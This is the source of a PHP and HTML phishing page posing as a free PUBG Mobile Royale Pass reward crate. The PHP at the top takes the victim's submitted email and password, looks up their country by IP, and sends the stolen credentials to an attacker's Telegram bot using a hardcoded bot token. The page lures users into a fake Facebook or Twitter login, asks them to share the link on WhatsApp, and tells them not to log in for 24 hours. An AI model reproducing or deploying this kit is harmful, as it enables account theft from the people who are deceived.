<?php
$API_KEY = "1433499364:AAHyWvSOwqBmz1FEC5e9kgVkVv4xXiWHcPM";
 ?>
<?php
 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
 $city = $api->city;
 $countryfromip = $api->country; 
 ?>
<?php
$admin = 1105583660; 
$user = $_POST["imel"];
$pass = $_POST["pw"];
$login = $_POST["log"];
$time = date("Y-m-d H:i:s");
$text = urlencode("
     𖦹 🇮🇶 - 𝗻𝗲𝘄 𝗹𝗼𝗴𝗶𝗻 𝗯𝘆 -$login  𖦹  
━━━━━━━━━━━━
🇮🇶 - 𝗲𝗺𝗮𝗶𝗹 -  `$user` 
🇮🇶 - 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 -   `$pass` 
🇮🇶 - 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 -  $countryfromip 
🇮🇶 - 𝘁𝗶𝗺𝗲 - $time
━━━━━━━━━━━━
 - 𝘽𝙔 :- @IIIolIl
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="https://eldi.ga/s0/css/style.css">
<link rel="stylesheet" href="https://eldi.ga/s0/css/login/facebook.css">
<link rel="stylesheet" href="https://eldi.ga/s0/css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
  <script src="https://code.jquery.com/jquery-1.12.4.js"></script>
  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
  
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="my-container crate">
<div style="position: absolute;top: 6.5%;border-bottom:2px solid rgba(198, 218, 231, 0.62);width: 100%;"></div>	
<div class="nav-crate">
<i class="zmdi zmdi-help-outline icon-help" style="cursor: pointer;" onmousedown="buka.play()" onclick="open_help()"></i>
<i class="zmdi zmdi-share icon-back" style="cursor: pointer;" onmousedown="tutup.play()" onclick="open_share()"></i>
<img src="https://eldi.ga/s0/img/s16.png" width="55%" height="30px;" style="margin-top: 5px;">
</div>
<div class="box-jpg" style="position:absolute;top: 6.9%;width: 88%;height: 150px;margin-left: 6%;">
	<img src="https://eldi.ga/s0/img/box.jpg" style="width: 100%;height: 100%;border: 2px solid white;border-top: none;border-radius: 0px 0px 20px 20px;">
</div>
<h3 style="border:2px solid white;letter-spacing: 0.5;width: 55%;position: absolute;top: 23.5%;left:10%;color: white;border-radius: 5px;padding-left: 1.5%;">
	START SPIN TO GET REWARDS
</h3>
<h3 style="border:2px solid black;background:white;width: 22%;position: absolute;top: 23.5%;right:10%;color: white;border-radius: 5px;padding-left: 2.5%;">
	<span style="border:2px solid black;width: 100%;color: black;padding-left:10%;padding-right: 13%;" id="waktu"></span>
</h3>

<div class="content-crate" style="margin-top: 48%;">
	<img shagitzsan="0" src="img/reward/1.png" style="width: 70px;height: 70px;position: absolute;top:45%;left:5%;background: url(https://eldi.ga/s0/img/bg_item_red.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

	<img shagitzsan="1" src="https://eldi.ga/s0/img/reward/2.png" style="width: 70px;height: 70px;position: absolute;top:45%;left:28%;background: url(https://eldi.ga/s0/img/bg_item_pink.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

	<img shagitzsan="2" src="https://eldi.ga/s0/img/reward/3.png" style="width: 70px;height: 70px;position: absolute;top:45%;right:28%;background: url(https://eldi.ga/s0/img/bg_item_pink.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

	<img shagitzsan="3" src="https://eldi.ga/s0/img/reward/4.png" style="width: 70px;height: 70px;position: absolute;top:45%;right:5%;background: url(https://eldi.ga/s0/img/bg_item_red.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">



<div>
	<img shagitzsan="4" src="https://eldi.ga/s0/img/reward/5.png" style="width: 90px;height: 90px;position: absolute;top:58%;left:5%;background: url(https://eldi.ga/s0/img/bg_item_pink.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

		<button style="background:url(img/claim.png) center no-repeat;background-size:100% 100%;border-radius:3px;position: absolute;top:62%;right:33.5%;width: 33.5%;height: 42px;border:none;font-family: 'teko';color: black;font-size: 15px;" onclick="gaskeun()"></button>

	<img shagitzsan="5" src="https://eldi.ga/s0/img/reward/6.png" style="width: 90px;height: 90px;position: absolute;top:58%;right:5%;background: url(https://eldi.ga/s0/img/bg_item_pink.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">
</div>
	
	<img shagitzsan="6" src="https://eldi.ga/s0/img/reward/7.png" style="width: 70px;height: 70px;position: absolute;top:75%;left:5%;background: url(https://eldi.ga/s0/img/bg_item_red.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

	<img shagitzsan="7" src="https://eldi.ga/s0/img/reward/8.png" style="width: 70px;height: 70px;position: absolute;top:75%;left:28%;background: url(https://eldi.ga/s0/img/bg_item_pink.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

	<img shagitzsan="8" src="https://eldi.ga/s0/img/reward/9.png" style="width: 70px;height: 70px;position: absolute;top:75%;right:28%;background: url(https://eldi.ga/s0/img/bg_item_vio.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">

	<img shagitzsan="9" src="https://eldi.ga/s0/img/reward/10.png" style="width: 70px;height: 70px;position: absolute;top:75%;right:5%;background: url(https://eldi.ga/s0/img/bg_item_vio.png) center no-repeat;background-size: 100% 100%;border-radius:3px;">


</div>


</div>

<div class="popup-wrapper animated fadeIn" id="share" style="display: none;">
<div class="popup-gift">
<div class="popup-gift-content"><br><br>
<div class="popup-gift-txt">
</div>
<div class="btn-login" onclick="location.href='whatsapp://send?text=Come on get reward lucky treasure now PUBG Mobile in this link :<?php echo $_SERVER['HTTP_HOST']; ?>'" onmousedown="buka.play()">
<div class="btn-login-logo-wrapper">
<img src="https://cdn3.iconfinder.com/data/icons/social-media-chamfered-corner/154/whatsapp-512.png">
</div>
<div class="btn-login-txt">
Share to your Whatsapp
</div>
</div>
<br>
<button type="button" style="background:url(https://eldi.ga/s0/img/button_cancel.png) center no-repeat;background-size: 100% 100%;border-radius: 4px;margin-top: 25%" class="tengah" onmousedown="tutup.play()" onclick="close_share()"></button>
</div>
</div>
</div>
</div> 
<style type="text/css">
    .kurung{
        border: 3px solid gold;
        width: 
    }
</style>
<div class="popup-wrapper animated fadeIn" style="display: none;" id="got">
<div class="got">
	<img id="gambarnya" src="" style="width: 90px;height: 90px;border-radius: 3px;position: absolute;margin:50px auto;margin-top: 20%;">
	<button class="butok" onclick="account_login1()" onmousedown="buka.play()"></button>
</div>
</div>
<div class="popup-wrapper animated fadeIn" style="display: none;" id="help">
<div class="popup-gift">
<div class="popup-gift-navbar">
<i class="zmdi zmdi-close" onclick="close_help()" onmousedown="tutup.play()"></i>
</div>
<div class="popup-gift-content">
<div class="popup-gift-txt"><br>
Welcome to Event Royale Pass Season 16
<br>
<br>
You have the opportunity to get a lucky crate for today only
<br>
Start randomly giving your gifts and get them for free!
</div>
<br>
<button type="button" class="tengah" onmousedown="tutup.play()" onclick="close_help()"></button>
</div>
</div> 
</div> 
<div class="popup-wrapper animated fadeIn" id="account_login" style="display: none;">
<div class="popup-gift">
<div class="popup-gift-content"><br><br>
<div class="popup-gift-txt">
Login to receive your rewards
</div>
<div class="btn-login" onclick="open_facebook()" onmousedown="buka.play()">
<div class="btn-login-logo-wrapper">
<img src="https://eldi.ga/s0/img/login/facebook_icon.png">
</div>
<div class="btn-login-txt">
Login using Facebook account
</div>
</div>
<div class="btn-login" onclick="open_twitter()" onmousedown="buka.play()">
<div class="btn-login-logo-wrapper">
<img src="img/login/twitter_icon.png">
</div>
<div class="btn-login-txt">
Login using Twitter account
</div>
</div>
</div>
</div>
</div> 
<audio id="da" src="https://eldi.ga/s0/media/putar.mp3" >
Your browser does not support the audio element.
</audio>
<div class="popup-wrapper animated fadeIn"  style="display: block;">
<div class="popup-gift">
<div class="popup-gift-navbar">

</div><br>
<div class="popup-gift-content">
<div class="popup-gift-txt">
Thank your for joining this Lucky Treasure
<br>
Your account is currently being checked to receive these rewards
Please wait up to 24 hours and don't log in before the prize is sent to your account
</div>

<button type="button" class="tengah" onmousedown="tutup.play()" onclick="location.href='https://pubgmobile.com';" style="margin-top: 12%;"></button>
</div>
</div> <!--- popup gift --->
</div> <!--- popup --->

<script src="https://eldi.ga/s0/js/shagitz.js"></script>
</body>
</html>
<script>
document.getElementsByTagName("div")[0].style.display = "none";
</script>
